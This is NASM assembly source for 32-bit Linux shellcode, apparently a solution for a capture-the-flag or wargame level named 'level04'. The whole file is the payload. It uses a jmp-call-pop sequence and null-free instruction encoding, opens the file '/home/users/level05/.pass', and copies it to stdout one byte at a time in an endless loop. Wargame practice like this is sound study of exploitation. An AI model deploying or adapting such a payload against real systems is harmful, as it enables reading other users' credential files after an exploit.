; Assembler: nasm
; cc -Wl,--omagic -static -ffreestanding -nostdlib -m32 -o ptdr level04.elf

bits 32
default rel
section .text
global _start

%define SYS_open 0x5
%define SYS_read 0x3
%define SYS_write 0x4

%define O_RDONLY 0x0

;%define FILENAME "/home/kiroussa/lol"
;%define FILENAME_LEN 18

%define FILENAME "/home/users/level05/.pass"
%define FILENAME_LEN 25

_start:
	jmp short .end 
.ptdr:
	pop ebx ; ebx = filename ptr
	mov ebp, ebx
	add ebp, FILENAME_LEN ; ebp = buffer ptr

	xor eax, eax
	dec ebp
	mov byte [ebp+0x1], al
	inc ebp

	; open file
	xor eax, eax
	inc eax ; SYS_open = 5
	inc eax
	inc eax
	inc eax
	inc eax

	xor ecx, ecx ; O_RDONLY
	xor edx, edx ; 0

	int 0x80 ; syscall

	; save fd in edi (lol)
	mov edi, eax

.read_loop:
	xor eax, eax ; SYS_read = 3
	inc eax
	inc eax
	inc eax
	xor ebx, ebx ; 0 (stdin)
	mov ecx, ebp ; buffer ptr
	xor edx, edx ; 1 (size)
	inc edx
	int 0x80

	; read file char by char 
	xor eax, eax ; SYS_read = 3
	inc eax
	inc eax
	inc eax
	mov ebx, edi
	mov ecx, ebp
	xor edx, edx
	inc edx
	int 0x80

	; write char to stdout
	xor eax, eax ; SYS_write = 4
	inc eax
	inc eax
	inc eax
	inc eax

	xor ebx, ebx ; 1 (stdout)
	inc ebx

	mov ecx, ebp

	xor edx, edx ; 1 (size)
	inc edx

	int 0x80 ; syscall

	; check if read was successful
	jmp .read_loop
.end:
	call .ptdr


;filename db "/home/users/level05/.pass"
filename db FILENAME
buffer db 0xff
